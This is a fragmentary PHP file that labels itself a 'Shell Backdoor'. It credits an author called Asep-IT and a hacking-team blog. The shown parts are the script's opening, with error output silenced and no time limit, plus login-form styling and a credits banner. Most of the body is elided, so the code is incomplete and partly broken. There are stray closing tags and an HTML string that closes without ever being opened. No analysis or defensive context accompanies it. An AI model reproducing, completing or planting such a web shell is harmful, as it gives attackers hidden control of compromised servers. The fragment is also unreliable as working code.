  <?php
  //thanks to : Asep-IT Vakum(Shell  Backdoor) 
  session_start();
  @error_reporting(0);
  @set_time_limit(0);
  ...
  <style type="text/css">body, a:hover {cursor: url(), url(#), progress !important;}</style><img src="#" border="0" alt="Toad Jumping Up and Down" style="position:absolute; top: 0px; right: 0px;" /></a></style>
  <style>
  input[type="email"] {
  ...
  input[type="submit"] {
    ...
    color:#fff;
  	...
  	<br>
  	<font color="lime" size="5"><b><pre>Coded by Asep-IT Ganz </font></b></pre>
    <hr color="lime">
    <font color="lime" size="5"><pre> Thanks to :  <a href="http://unitedcyberteam.blogspot.com/">Unitedcyberteam</a>   - Asep-IT Ganz</pre></font>
     </center>
      </body>
  </html>';
